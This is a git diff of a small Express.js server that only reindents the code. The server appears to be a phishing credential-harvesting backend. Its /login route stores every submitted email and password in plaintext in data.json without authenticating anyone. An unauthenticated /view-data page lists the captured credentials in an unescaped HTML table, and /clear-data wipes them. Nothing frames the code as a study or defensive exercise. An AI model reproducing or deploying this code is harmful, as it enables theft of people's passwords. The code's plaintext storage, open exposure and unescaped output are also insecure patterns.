@@ -12,60 +12,60 @@ app.use(express.static('public')); // Serve static files from the "public" folde
 
 // Serve the login page at the root ("/")
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'login.html'));  // Adjust this path to your HTML file
+  res.sendFile(path.join(__dirname, 'public', 'login.html'));  // Adjust this path to your HTML file
 });
 
 // Handle login POST request
 app.post('/login', (req, res) => {
-    const { email, password } = req.body;
+  const { email, password } = req.body;
 
-    // Load existing data
-    const filePath = path.join(__dirname, 'data.json');
-    let data = [];
+  // Load existing data
+  const filePath = path.join(__dirname, 'data.json');
+  let data = [];
 
-    try {
-        if (fs.existsSync(filePath)) {
-            const fileData = fs.readFileSync(filePath, 'utf8');
-            data = JSON.parse(fileData);
-        }
-    } catch (err) {
-        console.error('Error reading the file:', err);
-        return res.status(500).json({ message: 'Internal Server Error' });
+  try {
+    if (fs.existsSync(filePath)) {
+      const fileData = fs.readFileSync(filePath, 'utf8');
+      data = JSON.parse(fileData);
     }
+  } catch (err) {
+    console.error('Error reading the file:', err);
+    return res.status(500).json({ message: 'Internal Server Error' });
+  }
 
-    // Add new login data
-    data.push({ email, password });
+  // Add new login data
+  data.push({ email, password });
 
-    try {
-        // Save updated data
-        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
-        res.json({ message: 'Login data stored successfully!' });
-    } catch (err) {
-        console.error('Error writing to the file:', err);
-        return res.status(500).json({ message: 'Error saving login data' });
-    }
+  try {
+    // Save updated data
+    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+    res.json({ message: 'Login data stored successfully!' });
+  } catch (err) {
+    console.error('Error writing to the file:', err);
+    return res.status(500).json({ message: 'Error saving login data' });
+  }
 });
 
 // ✅ NEW: View login data in a table
 app.get('/view-data', (req, res) => {
-    const filePath = path.join(__dirname, 'data.json');
+  const filePath = path.join(__dirname, 'data.json');
 
-    if (!fs.existsSync(filePath)) {
-        return res.send('<p>No data found yet.</p>');
-    }
+  if (!fs.existsSync(filePath)) {
+    return res.send('<p>No data found yet.</p>');
+  }
 
-    let data = [];
-    try {
-        const fileData = fs.readFileSync(filePath, 'utf8');
-        data = JSON.parse(fileData);
-    } catch (err) {
-        console.error('Error reading the file:', err);
-        return res.status(500).json({ message: 'Error reading login data' });
-    }
+  let data = [];
+  try {
+    const fileData = fs.readFileSync(filePath, 'utf8');
+    data = JSON.parse(fileData);
+  } catch (err) {
+    console.error('Error reading the file:', err);
+    return res.status(500).json({ message: 'Error reading login data' });
+  }
 
-    const rows = data.map(d => `<tr><td>${d.email}</td><td>${d.password}</td></tr>`).join('');
+  const rows = data.map(d => `<tr><td>${d.email}</td><td>${d.password}</td></tr>`).join('');
 
-    const html = `
+  const html = `
     <!DOCTYPE html>
     <html>
     <head>
@@ -112,28 +112,28 @@ app.get('/view-data', (req, res) => {
     </html>
     `;
 
-    res.send(html);
+  res.send(html);
 });
 
 // Handle "Clear All" data request
 app.get('/clear-data', (req, res) => {
-    const filePath = path.join(__dirname, 'data.json');
+  const filePath = path.join(__dirname, 'data.json');
 
-    if (fs.existsSync(filePath)) {
-        try {
-            // Clear the content of the file (set it to an empty array)
-            fs.writeFileSync(filePath, JSON.stringify([], null, 2));
-            console.log('All data cleared successfully!');
-            res.redirect('/view-data');  // Redirect back to the view-data page to show the updated data (empty)
-        } catch (err) {
-            console.error('Error clearing the file:', err);
-            return res.status(500).json({ message: 'Error clearing login data' });
-        }
-    } else {
-        res.status(404).json({ message: 'Data file not found' });
+  if (fs.existsSync(filePath)) {
+    try {
+      // Clear the content of the file (set it to an empty array)
+      fs.writeFileSync(filePath, JSON.stringify([], null, 2));
+      console.log('All data cleared successfully!');
+      res.redirect('/view-data');  // Redirect back to the view-data page to show the updated data (empty)
+    } catch (err) {
+      console.error('Error clearing the file:', err);
+      return res.status(500).json({ message: 'Error clearing login data' });
     }
+  } else {
+    res.status(404).json({ message: 'Data file not found' });
+  }
 });
 
 app.listen(PORT, () => {
-    console.log(`Server is running at http://localhost:${PORT}`);
+  console.log(`Server is running at http://localhost:${PORT}`);
 });
